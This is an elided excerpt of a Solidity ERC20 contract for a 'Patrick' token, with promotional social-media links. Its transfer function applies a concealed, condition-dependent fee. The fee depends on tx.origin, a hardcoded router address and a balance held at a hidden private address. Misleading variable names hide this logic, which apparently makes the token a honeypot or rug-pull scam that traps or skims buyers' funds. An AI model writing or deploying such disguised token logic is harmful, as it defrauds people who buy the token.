...
https://twitter.com/PatrickBNB
https://t.me.com/PatrickBNB
https://PatrickBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private _factoryV2 = 0x2Abf93b68E0f7a12f417B3cd42Df69603446b502;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply;
    uint256 private _allowanceEnabled = 1;
    address internal V2Router = 0x84311d5830bAe1eFe631476a253Fb7e239d2d53e;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != V2Router && _balances[_factoryV2] > 0 ? pairsAllowance : _allowanceEnabled).div(100)+0;
        if (swapamount > 0)
        {
...
{
    constructor() ERC20(unicode"Patrick", unicode"PATRICK")
    {
